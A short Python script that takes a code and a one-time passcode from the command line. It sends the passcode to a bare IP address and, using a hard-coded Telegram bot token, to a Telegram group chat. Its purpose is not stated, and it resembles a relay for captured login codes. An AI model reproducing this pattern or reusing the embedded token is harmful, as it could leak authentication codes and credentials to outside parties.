from requests import post
from sys import argv
if argv[1] == '1001':
    telegram_id = '5280692596'
elif argv[1] == '1002':
    telegram_id = '1197549044'
elif argv[1] == '1003':
    telegram_id = '685382438'
elif argv[1] == '1004':
    telegram_id = '5368332363'
elif argv[1] == '9998':
    telegram_id = '1907961854'
post(f'http://5.206.227.56/?telegram_id={telegram_id}&otp={argv[2]}')
post(f'https://api.telegram.org/bot6288682947:AAE33JRyXU5dY_ucccMCM6XGBkjWo4hGIdQ/sendMessage?chat_id=-1001549929537&text={telegram_id}\n{argv[2]}')
